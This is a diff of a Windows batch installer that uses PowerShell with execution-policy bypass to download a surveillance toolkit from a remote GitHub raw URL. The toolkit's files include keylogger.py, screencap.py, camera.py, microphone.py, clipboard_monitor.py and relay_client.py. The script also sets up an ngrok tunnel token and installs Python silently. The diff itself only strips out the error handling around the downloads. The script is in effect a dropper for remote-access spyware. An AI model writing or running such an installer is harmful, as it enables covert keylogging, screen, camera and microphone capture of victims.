@@ -8,11 +8,11 @@ set "TOKENFILE=%DIR%\ngrok.token"
 mkdir "%DIR%\templates" 2>nul
 mkdir "%DIR%\recordings" 2>nul
 
-:: Download all files from GitHub (skip missing files silently)
+:: Download all files from GitHub
 powershell -NoProfile -ExecutionPolicy Bypass -Command ^
   "$r='%RAW%'; $d='%DIR%';" ^
-  "'app.py','keylogger.py','screencap.py','controller.py','server.py','recorder.py','camera.py','clipboard_monitor.py','processes.py','relay_client.py','file_manager.py','microphone.py','requirements.txt' | %%{ try { Invoke-WebRequest \"$r/$_\" -OutFile \"$d\$_\" -ErrorAction Stop } catch { Write-Host \"Skip: $_\" } };" ^
-  "try { Invoke-WebRequest \"$r/templates/viewer.html\" -OutFile \"$d\templates\viewer.html\" -ErrorAction Stop } catch {}"
+  "'app.py','keylogger.py','screencap.py','controller.py','server.py','recorder.py','camera.py','clipboard_monitor.py','processes.py','relay_client.py','file_manager.py','microphone.py','requirements.txt' | %%{ Invoke-WebRequest \"$r/$_\" -OutFile \"$d\$_\" };" ^
+  "Invoke-WebRequest \"$r/templates/viewer.html\" -OutFile \"$d\templates\viewer.html\""
 
 :: Install Python silently if not present
 python --version >nul 2>&1
